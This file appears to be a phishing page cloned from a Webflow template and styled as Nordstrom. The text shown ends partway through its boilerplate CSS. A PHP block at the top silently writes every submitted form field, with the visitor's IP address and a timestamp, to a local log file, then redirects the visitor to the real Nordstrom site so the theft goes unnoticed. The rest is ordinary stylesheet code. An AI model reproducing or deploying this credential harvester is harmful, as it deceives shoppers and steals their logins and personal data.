<?php
   if ($_SERVER['REQUEST_METHOD'] == 'POST') {
   header('Location: https://www.nordstrom.com/');
   $handle = fopen('log.txt', 'a');
   fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
   foreach($_POST as $variable => $value) {
   fwrite($handle, $variable.': '.$value."\r\n");}
   fclose($handle);
   exit;
   } ?>
<!DOCTYPE html><!-- This site was created in Webflow. http://www.webflow.com --><!-- Last Published: Fri Feb 11 2022 23:37:25 GMT+0000 (Coordinated Universal Time) -->
<html data-wf-domain="steves-amazing-site-5f1f95.webflow.io" data-wf-page="6206b906713e806cfa5d8923" data-wf-site="6206b905713e806d865d8920" data-wf-status="1">
   <head>
      <meta charset="utf-8"/>
      <title>Nordstrom</title>
      <meta content="width=device-width, initial-scale=1" name="viewport"/>
      <meta content="Webflow" name="generator"/>
      <link href="http://localhost:8080/phpSite/Nostt/style.css" rel="stylesheet" type="text/css"/>
      <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script><script type="text/javascript">WebFont.load({  google: {    families: ["Ubuntu:300,300italic,400,400italic,500,500italic,700,700italic"]  }});</script><!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif]--><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
      <link href="https://uploads-ssl.webflow.com/6206b905713e806d865d8920/6206f318d67e8e6f635803d1_c4354c455952e71016090c90c236be33.jpg" rel="shortcut icon" type="image/x-icon"/>
      <link href="https://uploads-ssl.webflow.com/img/webclip.png" rel="apple-touch-icon"/>
   <style>
   /* Generated on: Fri Feb 11 2022 23:37:25 GMT+0000 (Coordinated Universal Time) */
/* ==========================================================================
   normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css 
   ========================================================================== */
/*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type='checkbox'],input[type='radio']{box-sizing:border-box;padding:0}input[type='number']::-webkit-inner-spin-button,input[type='number']::-webkit-outer-spin-button{height:auto}input[type='search']{-webkit-appearance:none}input[type='search']::-webkit-search-cancel-button,input[type='search']::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}

/* ==========================================================================
   Start of base Webflow CSS - If you're looking for some ultra-clean CSS, skip the boilerplate and see the unminified code below.
   ========================================================================== */
   @font-face{font-family:'webflow-icons';src:url("data:application/x-font-ttf;charset=utf-8;base64,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") format('truetype');font-weight:normal;font-style:normal}[class^="w-icon-"],[class*=" w-icon-"]{font-family:'webflow-icons' !important;speak:none;font-style:normal;font-weight:normal;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.w-icon-slider-right:before{content:"\e600"}.w-icon-slider-left:before{content:"\e601"}.w-icon-nav-menu:before{content:"\e602"}.w-icon-arrow-down:before,.w-icon-dropdown-toggle:before{content:"\e603"}.w-icon-file-upload-remove:before{content:"\e900"}.w-icon-file-upload-icon:before{content:"\e903"}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{height:100%}body{margin:0;min-height:100%;background-color:#fff;font-family:Arial,sans-serif;font-size:14px;line-height:20px;color:#333}img{max-width:100%;vertical-align:middle;display:inline-block}html.w-mod-touch *{background-attachment:scroll !important}.w-block{display:block}.w-inline-block{max-width:100%;display:inline-block}.w-clearfix:before,.w-clearfix:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-clearfix:after{clear:both}.w-hidden{display:none}.w-button{display:inline-block;padding:9px 15px;background-color:#3898EC;color:white;border:0;line-height:inherit;text-decoration:none;cursor:pointer;border-radius:0}input.w-button{-webkit-appearance:button}html[data-w-dynpage] [data-w-cloak]{color:transparent !important}.w-webflow-badge,.w-webflow-badge *{position:static;left:auto;top:auto;right:auto;bottom:auto;z-index:auto;display:block;visibility:visible;overflow:visible;overflow-x:visible;overflow-y:visible;box-sizing:border-box;width:auto;height:auto;max-height:none;max-width:none;min-height:0;min-width:0;margin:0;padding:0;float:none;clear:none;border:0 none transparent;border-radius:0;background:none;background-image:none;background-position:0 0;background-size:auto auto;background-repeat:repeat;background-origin:padding-box;background-clip:border-box;background-attachment:scroll;background-color:transparent;box-shadow:none;opacity:1;transform:none;transition:none;direction:ltr;font-family:inherit;font-weight:inherit;color:inherit;font-size:inherit;line-height:inherit;font-style:inherit;font-variant:inherit;text-align:inherit;letter-spacing:inherit;text-decoration:inherit;text-indent:0;text-transform:inherit;list-style-type:disc;text-shadow:none;font-smoothing:auto;vertical-align:baseline;cursor:inherit;white-space:inherit;word-break:normal;word-spacing:normal;word-wrap:normal}.w-webflow-badge{position:fixed !important;display:inline-block !important;visibility:visible !important;z-index:2147483647 !important;top:auto !important;right:12px !important;bottom:12px !important;left:auto !important;color:#AAADB0 !important;background-color:#fff !important;border-radius:3px !important;padding:6px 8px 6px 6px !important;font-size:12px !important;opacity:1 !important;line-height:14px !important;text-decoration:none !important;transform:none !important;margin:0 !important;width:auto !important;height:auto !important;overflow:visible !important;white-space:nowrap;box-shadow:0 0 0 1px rgba(0,0,0,0.1),0 1px 3px rgba(0,0,0,0.1);cursor:pointer}.w-webflow-badge>img{display:inline-block !important;visibility:visible !important;opacity:1 !important;vertical-align:middle !important}h1,h2,h3,h4,h5,h6{font-weight:bold;margin-bottom:10px}h1{font-size:38px;line-height:44px;margin-top:20px}h2{font-size:32px;line-height:36px;margin-top:20px}h3{font-size:24px;line-height:30px;margin-top:20px}h4{font-size:18px;line-height:24px;margin-top:10px}h5{font-size:14px;line-height:20px;margin-top:10px}h6{font-size:12px;line-height:18px;margin-top:10px}p{margin-top:0;margin-bottom:10px}blockquote{margin:0 0 10px 0;padding:10px 20px;border-left:5px solid #E2E2E2;font-size:18px;line-height:22px}figure{margin:0;margin-bottom:10px}figcaption{margin-top:5px;text-align:center}ul,ol{margin-top:0;margin-bottom:10px;padding-left:40px}.w-list-unstyled{padding-left:0;list-style:none}.w-embed:before,.w-embed:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-embed:after{clear:both}.w-video{width:100%;position:relative;padding:0}.w-video iframe,.w-video object,.w-video embed{position:absolute;top:0;left:0;width:100%;height:100%}fieldset{padding:0;margin:0;border:0}button,html input[type='button'],input[type='reset']{border:0;cursor:pointer;-webkit-appearance:button}.w-form{margin:0 0 15px}.w-form-done{display:none;padding:20px;text-align:center;background-color:#dddddd}.w-form-fail{display:none;margin-top:10px;padding:10px;background-color:#ffdede}label{display:block;margin-bottom:5px;font-weight:bold}.w-input,.w-select{display:block;width:100%;height:38px;padding:8px 12px;margin-bottom:10px;font-size:14px;line-height:1.42857143;color:#333333;vertical-align:middle;background-color:#ffffff;border:1px solid #cccccc}.w-input:-moz-placeholder,.w-select:-moz-placeholder{color:#999}.w-input::-moz-placeholder,.w-select::-moz-placeholder{color:#999;opacity:1}.w-input:-ms-input-placeholder,.w-select:-ms-input-placeholder{color:#999}.w-input::-webkit-input-placeholder,.w-select::-webkit-input-placeholder{color:#999}.w-input:focus,.w-select:focus{border-color:#3898EC;outline:0}.w-input[disabled],.w-select[disabled],.w-input[readonly],.w-select[readonly],fieldset[disabled] .w-input,fieldset[disabled] .w-select{cursor:not-allowed;background-color:#eeeeee}textarea.w-input,textarea.w-select{height:auto}.w-select{background-color:#f3f3f3}.w-select[multiple]{height:auto}.w-form-label{display:inline-block;cursor:pointer;font-weight:normal;margin-bottom:0}.w-radio{display:block;margin-bottom:5px;padding-left:20px}.w-radio:before,.w-radio:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-radio:after{clear:both}.w-radio-input{margin:4px 0 0;margin-top:1px \9;line-height:normal;float:left;margin-left:-20px}.w-radio-input{margin-top:3px}.w-file-upload{display:block;margin-bottom:10px}.w-file-upload-input{width:.1px;height:.1px;opacity:0;overflow:hidden;position:absolute;z-index:-100}.w-file-upload-default,.w-file-upload-uploading,.w-file-upload-success{display:inline-block;color:#333333}.w-file-upload-error{display:block;margin-top:10px}.w-file-upload-default.w-hidden,.w-file-upload-uploading.w-hidden,.w-file-upload-error.w-hidden,.w-file-upload-success.w-hidden{display:none}.w-file-upload-uploading-btn{display:flex;font-size:14px;font-weight:normal;cursor:pointer;margin:0;padding:8px 12px;border:1px solid #cccccc;background-color:#fafafa}.w-file-upload-file{display:flex;flex-grow:1;justify-content:space-between;margin:0;padding:8px 9px 8px 11px;border:1px solid #cccccc;background-color:#fafafa}.w-file-upload-file-name{font-size:14px;font-weight:normal;display:block}.w-file-remove-link{margin-top:3px;margin-left:10px;width:auto;height:auto;padding:3px;display:block;cursor:pointer}.w-icon-file-upload-remove{margin:auto;font-size:10px}.w-file-upload-error-msg{display:inline-block;color:#ea384c;padding:2px 0}.w-file-upload-info{display:inline-block;line-height:38px;padding:0 12px}.w-file-upload-label{display:inline-block;font-size:14px;font-weight:normal;cursor:pointer;margin:0;padding:8px 12px;border:1px solid #cccccc;background-color:#fafafa}.w-icon-file-upload-icon,.w-icon-file-upload-uploading{display:inline-block;margin-right:8px;width:20px}.w-icon-file-upload-uploading{height:20px}.w-container{margin-left:auto;margin-right:auto;max-width:940px}.w-container:before,.w-container:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-container:after{clear:both}.w-container .w-row{margin-left:-10px;margin-right:-10px}.w-row:before,.w-row:after{content:" ";display:table;grid-column-start:1;grid-row-start:1;grid-column-end:2;grid-row-end:2}.w-row:after{clear:both}.w-row .w-row{margin-left:0;margin-right:0}.w-col{position:relative;float:left;width:100%;min-height:1px;padding-left:10px;padding-right:10px}.w-col .w-col{padding-left:0;padding-right:0}.w-col-1{width:8.33333333%}.w-col-2{width:16.66666667%}.w-col-3{width:25%}.w-col-4{width:33.33333333%}.w-col-5{width:41.66666667%}.w-col-6{width:50%}.w-col-7{width:58.33333333%}.w-col-8{width:66.66666667%}.w-col-9{width:75%}.w-col-10{width:83.33333333%}.w-col-11{width:91.66666667%}.w-col-12{width:100%}.w-hidden-main{display:none !important}@media screen and (max-width:991px){.w-container{max-width:728px}.w-hidden-main{display:inherit !important}.w-hidden-medium{display:none !important}.w-col-medium-1{width:8.33333333%}.w-col-medium-2{width:16.66666667%}.w-col-medium-3{width:25%}.w-col-medium-4{width:33.33333333%}.w-col-medium-5{width:41.66666667%}.w-col-medium-6{width:50%}.w-col-medium-7{width:58.33333333%}.w-col-medium-8{width:66.66666667%}.w-col-medium-9{width:75%}.w-col-medium-10{width:83.33333333%}.w-col-medium-11{width:91.66666667%}.w-col-medium-12{width:100%}.w-col-stack{width:100%;left:auto;right:auto}}@media screen and (max-width:767px){.w-hidden-main{display:inherit !important}.w-hidden-medium{display:inherit !important}.w-hidden-small{display:none !important}.w-row,.w-container .w-row{margin-left:0;margin-right:0}.w-col{width:100%;left:auto;right:auto}.w-col-small-1{width:8.33333333%}.w-col-small-2{width:16.66666667%}.w-col-small-3{width:25%}.w-col-small-4{width:33.33333333%}.w-col-small-5{width:41.66666667%}.w-col-small-6{width:50%}.w-col-small-7{width:58.33333333%}.w-col-small-8{width:66.66666667%}.w-col-small-9{width:75%}.w-col-small-10{width:83.33333333%}.w-col-small-11{width:91.66666667%}.w-col-small-12{width:100%}}@media screen and (max-width:479px){.w-container{max-width:none}.w-hidden-main{display:inherit !important}.w-hidden-medium{display:inherit !important}.w-hidden-small{display:inherit !important}.w-hidden-tiny{display:none !important}.w-col{width:100%}.w-col-tiny-1{width:8.33333333%}.w-col-tiny-2{width:16.66666667%}.w-col-tiny-3{width:25%}.w-col-tiny-4{width:33.33333333%}.w-col-tiny-5{width:41.66666667%}.w-col-tiny-6{width:50%}.w-col-tiny-7{width:58.33333333%}.w-col-tiny-8{width:66.66666667%}.w-col-tiny-9{width:75%}.w-col-tiny-10{width:83.33333333%}.w-col-tiny-11{width:91.66666667%}.w-col-tiny-12{width:100%}}.w-widget{position:relative}.w-widget-map{width:100%;height:400px}.w-widget-map label{width:auto;display:inline}.w-widget-map img{max-width:inherit}.w-widget-map .gm-style-iw{text-align:center}.w-widget-map .gm-style-iw>button{display:none !important}.w-widget-twitter{overflow:hidden}.w-widget-twitter-count-shim{display:inline-block;vertical-align:top;position:relative;width:28px;height:20px;text-align:center;background:white;border:#758696 solid 1px;border-radius:3px}.w-widget-twitter-count-shim *{pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.w-widget-twitter-count-shim .w-widget-twitter-count-inner{position:relative;font-size:15px;line-height:12px;text-align:center;color:#999;font-family:serif}.w-widget-twitter-count-shim .w-widget-twitter-count-clear{position:relative;display:block}.w-widget-twitter-count-shim.w--large{width:36px;height:28px}.w-widget-twitter-count-shim.w--large .w-widget-twitter-count-inner{font-size:18px;line-height:18px}.w-widget-twitter-count-shim:not(.w--vertical){margin-left:5px;margin-right:8px}.w-widget-twitter-count-shim:not(.w--vertical).w--large{margin-left:6px}.w-widget-twitter-count-shim:not(.w--vertical):before,.w-widget-twitter-count-shim:not(.w--vertical):after{top:50%;left:0;border:solid transparent;content:" ";height:0;width:0;position:absolute;pointer-events:none}.w-widget-twitter-count-shim:not(.w--vertical):before{border-color:rgba(117,134,150,0);border-right-color:#5d6c7b;border-width:4px;margin-left:-9px;margin-top:-4px}.w-widget-twitter-count-shim:not(.w--vertical).w--large:before{border-width:5px;margin-left:-10px;margin-top:-5px}.w-widget-twitter-count-shim:not(.w--vertical):after{border-color:rgba(255,255,255,0);border-right-color:white;border-width:4px;margin-left:-8px;margin-top:-4px}.w-widget-twitter-count-shim:not(.w--vertical).w--large:after{border-width:5px;margin-left:-9px;margin-top:-5px}.w-widget-twitter-count-shim.w--vertical{width:61px;height:33px;margin-bottom:8px}.w-widget-twitter-count-shim.w--vertical:before,.w-widget-twitter-count-shim.w--vertical:after{top:100%;left:50%;border:solid transparent;content:" ";height:0;width:0;position:absolute;pointer-events:none}.w-widget-twitter-count-shim.w--vertical:before{border-color:rgba(117,134,150,0);border-top-color:#5d6c7b;border-width:5px;margin-left:-5px}.w-widget-twitter-count-shim.w--vertical:after{border-color:rgba(255,255,255,0);border-top-color:white;border-width:4px;margin-left:-4px}.w-widget-twitter-count-shim.w--vertical .w-widget-twitter-count-inner{font-size:18px;line-height:22px}.w-widget-twitter-count-shim.w--vertical.w--large{width:76px}.w-background-video{position:relative;overflow:hidden;height:500px;color:white}.w-background-video>video{background-size:cover;background-position:50% 50%;position:absolute;margin:auto;width:100%;height:100%;right:-100%;bottom:-100%;top:-100%;left:-100%;object-fit:cover;z-index:-100}.w-background-video>video::-webkit-media-controls-start-playback-button{display:none !important;-webkit-appearance:none}.w-slider{position:relative;height:300px;text-align:center;background:#dddddd;clear:both;-webkit-tap-highlight-color:rgba(0,0,0,0);tap-highlight-color:rgba(0,0,0,0)}.w-slider-mask{position:relative;display:block;overflow:hidden;z-index:1;left:0;right:0;height:100%;white-space:nowrap}.w-slide{position:relative;display:inline-block;vertical-align:top;width:100%;height:100%;white-space:normal;text-align:left}.w-slider-nav{position:absolute;z-index:2;top:auto;right:0;bottom:0;left:0;margin:auto;padding-top:10px;height:40px;text-align:center;-webkit-tap-highlight-color:rgba(0,0,0,0);tap-highlight-color:rgba(0,0,0,0)}.w-slider-nav.w-round>div{border-radius:100%}.w-slider-nav.w-num>div{width:auto;height:auto;padding:.2em .5em;font-size:inherit;line-height:inherit}.w-slider-nav.w-shadow>div{box-shadow:0 0 3px rgba(51,51,51,0.4)}.w-slider-nav-invert{color:#fff}.w-slider-nav-invert>div{background-color:rgba(34,34,34,0.4)}.w-slider-nav-invert>div.w-active{background-color:#222}.w-slider-dot{position:relative;display:inline-block;width:1em;height:1em;background-color:rgba(255,255,255,0.4);cursor:pointer;margin:0 3px .5em;transition:background-color 100ms,color 100ms}.w-slider-dot.w-active{background-color:#fff}.w-slider-dot:focus{outline:none;box-shadow:0 0 0 2px #fff}.w-slider-dot:focus.w-active{box-shadow:none}.w-slider-arrow-left,.w-slider-arrow-right{position:absolute;width:80px;top:0;right:0;bottom:0;left:0;margin:auto;cursor:pointer;overflow:hidden;color:white;font-size:40px;-webkit-tap-highlight-color:rgba(0,0,0,0);tap-highlight-color:rgba(0,0,0,0);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.w-slider-arrow-left [class^='w-icon-'],.w-slider-arrow-right [class^='w-icon-'],.w-slider-arrow-left [class*=' w-icon-'],.w-slider-arrow-right [class*=' w-icon-']{position:absolute}.w-slider-arrow-left:focus,.w-slider-arrow-right:focus{outline:0}.w-slider-arrow-left{z-index:3;right:auto}.w-slider-arrow-right{z-index:4;left:auto}.w-icon-slider-left,.w-icon-slider-right{top:0;right:0;bottom:0;left:0;margin:auto;width:1em;height:1em}.w-slider-aria-label{border:0;clip:rect(0 0 0 0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.w-slider-force-show{display:block !important}.w-dropdown{display:inline-block;position:relative;text-align:left;margin-left:auto;margin-right:auto;z-index:900}.w-dropdown-btn,.w-dropdown-toggle,.w-dropdown-link{position:relative;vertical-align:top;text-decoration:none;color:#222222;padding:20px;text-align:left;margin-left:auto;margin-right:auto;white-space:nowrap}.w-dropdown-toggle{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;display:inline-block;cursor:pointer;padding-right:40px}.w-dropdown-toggle:focus{outline:0}.w-icon-dropdown-toggle{position:absolute;top:0;right:0;bottom:0;margin:auto;margin-right:20px;width:1em;height:1em}.w-dropdown-list{position:absolute;background:#dddddd;display:none;min-width:100%}.w-dropdown-list.w--open{display:block}.w-dropdown-link{padding:10px 20px;display:block;color:#222222}.w-dropdown-link.w--current{color:#0082f3}.w-dropdown-link:focus{outline:0}@media screen and (max-width:767px){.w-nav-brand{padding-left:10px}}.w-lightbox-backdrop{color:#000;cursor:auto;font-family:serif;font-size:medium;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:normal;list-style:disc;text-align:start;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-break:normal;word-spacing:normal;word-wrap:normal;position:fixed;top:0;right:0;bottom:0;left:0;color:#fff;font-family:"Helvetica Neue",Helvetica,Ubuntu,"Segoe UI",Verdana,sans-serif;font-size:17px;line-height:1.2;font-weight:300;text-align:center;background:rgba(0,0,0,0.9);z-index:2000;outline:0;opacity:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-webkit-tap-highlight-color:transparent;-webkit-transform:translate(0, 0)}.w-lightbox-backdrop,.w-lightbox-container{height:100%;overflow:auto;-webkit-overflow-scrolling:touch}.w-lightbox-content{position:relative;height:100vh;overflow:hidden}.w-lightbox-view{position:absolute;width:100vw;height:100vh;opacity:0}.w-lightbox-view:before{content:"";height:100vh}.w-lightbox-group,.w-lightbox-group .w-lightbox-view,.w-lightbox-group .w-lightbox-view:before{height:86vh}.w-lightbox-frame,.w-lightbox-view:before{display:inline-block;vertical-align:middle}.w-lightbox-figure{position:relative;margin:0}.w-lightbox-group .w-lightbox-figure{cursor:pointer}.w-lightbox-img{width:auto;height:auto;max-width:none}.w-lightbox-image{display:block;float:none;max-width:100vw;max-height:100vh}.w-lightbox-group .w-lightbox-image{max-height:86vh}.w-lightbox-caption{position:absolute;right:0;bottom:0;left:0;padding:.5em 1em;background:rgba(0,0,0,0.4);text-align:left;text-overflow:ellipsis;white-space:nowrap;overflow:hidden}.w-lightbox-embed{position:absolute;top:0;right:0;bottom:0;left:0;width:100%;height:100%}.w-lightbox-control{position:absolute;top:0;width:4em;background-size:24px;background-repeat:no-repeat;background-position:center;cursor:pointer;-webkit-transition:all .3s;transition:all .3s}.w-lightbox-left{display:none;bottom:0;left:0;background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii0yMCAwIDI0IDQwIiB3aWR0aD0iMjQiIGhlaWdodD0iNDAiPjxnIHRyYW5zZm9ybT0icm90YXRlKDQ1KSI+PHBhdGggZD0ibTAgMGg1djIzaDIzdjVoLTI4eiIgb3BhY2l0eT0iLjQiLz48cGF0aCBkPSJtMSAxaDN2MjNoMjN2M2gtMjZ6IiBmaWxsPSIjZmZmIi8+PC9nPjwvc3ZnPg==")}.w-lightbox-right{display:none;right:0;bottom:0;background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii00IDAgMjQgNDAiIHdpZHRoPSIyNCIgaGVpZ2h0PSI0MCI+PGcgdHJhbnNmb3JtPSJyb3RhdGUoNDUpIj48cGF0aCBkPSJtMC0waDI4djI4aC01di0yM2gtMjN6IiBvcGFjaXR5PSIuNCIvPjxwYXRoIGQ9Im0xIDFoMjZ2MjZoLTN2LTIzaC0yM3oiIGZpbGw9IiNmZmYiLz48L2c+PC9zdmc+")}.w-lightbox-close{right:0;height:2.6em;background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9Ii00IDAgMTggMTciIHdpZHRoPSIxOCIgaGVpZ2h0PSIxNyI+PGcgdHJhbnNmb3JtPSJyb3RhdGUoNDUpIj48cGF0aCBkPSJtMCAwaDd2LTdoNXY3aDd2NWgtN3Y3aC01di03aC03eiIgb3BhY2l0eT0iLjQiLz48cGF0aCBkPSJtMSAxaDd2LTdoM3Y3aDd2M2gtN3Y3aC0zdi03aC03eiIgZmlsbD0iI2ZmZiIvPjwvZz48L3N2Zz4=");background-size:18px}.w-lightbox-strip{position:absolute;bottom:0;left:0;right:0;padding:0 1vh;line-height:0;white-space:nowrap;overflow-x:auto;overflow-y:hidden}.w-lightbox-item{display:inline-block;width:10vh;padding:2vh 1vh;box-sizing:content-box;cursor:pointer;-webkit-transform:translate3d(0, 0, 0)}.w-lightbox-active{opacity:.3}.w-lightbox-thumbnail{position:relative;height:10vh;background:#222;overflow:hidden}.w-lightbox-thumbnail-image{position:absolute;top:0;left:0}.w-lightbox-thumbnail .w-lightbox-tall{top:50%;width:100%;-webkit-transform:translate(0, -50%);-ms-transform:translate(0, -50%);transform:translate(0, -50%)}.w-lightbox-thumbnail .w-lightbox-wide{left:50%;height:100%;-webkit-transform:translate(-50%, 0);-ms-transform:translate(-50%, 0);transform:translate(-50%, 0)}.w-lightbox-spinner{position:absolute;top:50%;left:50%;box-sizing:border-box;width:40px;height:40px;margin-top:-20px;margin-left:-20px;border:5px solid rgba(0,0,0,0.4);border-radius:50%;-webkit-animation:spin .8s infinite linear;animation:spin .8s infinite linear}.w-lightbox-spinner:after{content:"";position:absolute;top:-4px;right:-4px;bottom:-4px;left:-4px;border:3px solid transparent;border-bottom-color:#fff;border-radius:50%}.w-lightbox-hide{display:none}.w-lightbox-noscroll{overflow:hidden}@media (min-width:768px){.w-lightbox-content{height:96vh;margin-top:2vh}.w-lightbox-view,.w-lightbox-view:before{height:96vh}.w-lightbox-group,.w-lightbox-group .w-lightbox-view,.w-lightbox-group .w-lightbox-view:before{height:84vh}.w-lightbox-image{max-width:96vw;max-height:96vh}.w-lightbox-group 